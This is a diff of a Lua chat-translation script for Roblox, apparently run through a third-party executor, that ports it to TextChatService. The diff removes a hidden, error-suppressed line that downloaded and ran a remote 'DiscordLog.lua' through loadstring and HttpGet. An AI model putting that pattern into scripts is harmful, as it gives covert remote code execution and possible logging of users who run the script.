@@ -1,12 +1,12 @@
 local Players = game:GetService('Players')
+local TextChatService = game:GetService('TextChatService')
 local CoreGui = game:GetService('CoreGui')
 local ReplicatedStorage = game:GetService('ReplicatedStorage')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
 
-local DCSCE = ReplicatedStorage.DefaultChatSystemChatEvents
-local SMR = DCSCE.SayMessageRequest
 local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer.PlayerGui
 local SelectedLanguage = 'es'
 local SaveIt = {}
 
@@ -40,12 +40,6 @@ local CountryCodes = {
 }
 
 local CreateUI = function()
-
-	task.spawn(function()
-		pcall(function()
-			loadstring(game:HttpGet('https://raw.githubusercontent.com/PivotEngine/Pedro.exe/main/DiscordLog.lua', true))()
-		end)
-	end)
 
 	local Pedroexe = Instance.new("ScreenGui")
 	local Frame = Instance.new("Frame")
@@ -161,31 +155,72 @@ local CreateUI = function()
 	Credits.TextWrapped = true
 
 	local HoverOverChat = function()
-		local PlayerGui = LocalPlayer.PlayerGui
-		local Chat = PlayerGui:WaitForChild('Chat')
-		Chat.Frame.ChatChannelParentFrame['Frame_MessageLogDisplay'].Scroller.DescendantAdded:Connect(function(Child)
-			if Child:IsA('TextLabel') and Child:FindFirstChildOfClass('TextButton') then
-				task.spawn(function()
-					repeat task.wait() until Child.Text:gsub("[_%s]*", "") ~= ""
-					
-					local LinkFrom = 'https://translate.googleapis.com/translate_a/single?client=gtx&dt=t&sl=' .. SelectedLanguage:lower() .. '&tl=en&q='
-
-					local ChatGet = Child.Text:gsub('^%s*(.-)%s*$', '%1')
-					local EncodeUrl = HttpService:UrlEncode(ChatGet)
-					local GetType = game:HttpGet(LinkFrom .. EncodeUrl, true)
-					
-					local Result = HttpService:JSONDecode(GetType)[1][1][1]
-					
-					Child.MouseEnter:Connect(function()
-						if SaveIt[Child] then
-							Translated.Text = SaveIt[Child][1]
-						end
-					end)
+		local Chat = PlayerGui:FindFirstChild('Chat') or CoreGui:FindFirstChild('ExperienceChat')
+		if Chat:IsDescendantOf(PlayerGui) then
+			Chat.Frame.ChatChannelParentFrame['Frame_MessageLogDisplay'].Scroller.DescendantAdded:Connect(function(Child)
+				if Child:IsA('TextLabel') and Child:FindFirstChildOfClass('TextButton') then
+					task.spawn(function()
+						repeat task.wait() until Child.Text:gsub("[_%s]*", "") ~= ""
+						local LinkFrom = 'https://translate.googleapis.com/translate_a/single?client=gtx&dt=t&sl=' .. SelectedLanguage:lower() .. '&tl=en&q='
+						local ChatGet = Child.Text:gsub('^%s*(.-)%s*$', '%1')
 						
-					SaveIt[Child] = {Result, ChatGet}
-				end)
-			end
-		end)
+						Child.InputBegan:Connect(function(Input)
+							if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+								for key, value in next, SaveIt do
+									if key == ChatGet then
+										Translated.Text = value
+										return
+									end
+								end
+
+								local EncodeUrl = HttpService:UrlEncode(ChatGet)
+								local GetType = game:HttpGet(LinkFrom .. EncodeUrl, true)
+								local Result = HttpService:JSONDecode(GetType)[1][1][1]
+
+								SaveIt[ChatGet] = Result
+								
+								Translated.Text = Result
+							end
+						end)
+					end)
+				end
+			end)
+		else
+			Chat.container.DescendantAdded:Connect(function(Child)
+				if Child:IsA('TextLabel') then
+					task.spawn(function()						
+						local LinkFrom = 'https://translate.googleapis.com/translate_a/single?client=gtx&dt=t&sl=' .. SelectedLanguage:lower() .. '&tl=en&q='
+						
+						local ChatGet
+
+						local _, count = Child.Text:gsub("/font", "")
+
+						if count == 4 then
+							ChatGet = Child.Text:reverse():match(">tnof/<(.-)>"):reverse()
+						else
+							ChatGet = Child.Text:reverse():match("(.-)%:"):reverse()
+						end
+						
+						Child.InputBegan:Connect(function(Input)
+							if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+								for key, value in next, SaveIt do
+									if key == ChatGet then
+										Translated.Text = value
+										return
+									end
+								end
+								
+								local EncodeUrl = HttpService:UrlEncode(ChatGet)
+								local GetType = game:HttpGet(LinkFrom .. EncodeUrl, true)
+								local Result = HttpService:JSONDecode(GetType)[1][1][1]
+								
+								SaveIt[ChatGet] = Result
+							end
+						end)
+					end)
+				end
+			end)
+		end
 	end
 
 	local ChooseLanguage = function()
@@ -235,17 +270,16 @@ local CreateUI = function()
 						SelectedLanguage = key
 					end
 				end
-				for key, value in next, SaveIt do
+				for key, _ in next, SaveIt do
 					local LinkFrom = 'https://translate.googleapis.com/translate_a/single?client=gtx&dt=t&sl=' .. SelectedLanguage:lower() .. '&tl=en&q='
-						
-					local ChatGet = value[2]
-					local EncodeUrl = HttpService:UrlEncode(ChatGet)
+
+					local EncodeUrl = HttpService:UrlEncode(key)
 					local GetType = game:HttpGet(LinkFrom .. EncodeUrl, true) 
-					
+
 					local Result = HttpService:JSONDecode(GetType)[1][1][1]
-						
-					value[1] = Result
-					
+
+					SaveIt[key] = Result
+
 					task.wait()
 				end
 			end)
@@ -266,8 +300,18 @@ local CreateUI = function()
 				local GetType = game:HttpGet(LinkTo .. EncodeUrl, true) 
 
 				local Result = HttpService:JSONDecode(GetType)[1][1][1]:gsub("أ", "ا")
-
-				SMR:FireServer(Result, 'All')
+				
+				local PlayerGui = LocalPlayer.PlayerGui
+				
+				local Chat = PlayerGui:FindFirstChild('Chat') or CoreGui:FindFirstChild('ExperienceChat')
+				
+				if Chat:IsDescendantOf(PlayerGui) then
+					local DCSCE = ReplicatedStorage.DefaultChatSystemChatEvents
+					local SMR = DCSCE.SayMessageRequest
+					SMR:FireServer(Result, 'All')
+				else
+					TextChatService.TextChannels.RBXGeneral:SendAsync(Result)
+				end
 
 				TextBox.Text = ""
 			end)
@@ -284,7 +328,7 @@ local CreateUI = function()
 			Pedroexe.Enabled = not Pedroexe.Enabled
 		end
 	end)
-	
+
 	HoverOverChat()
 	ChooseLanguage()
 end
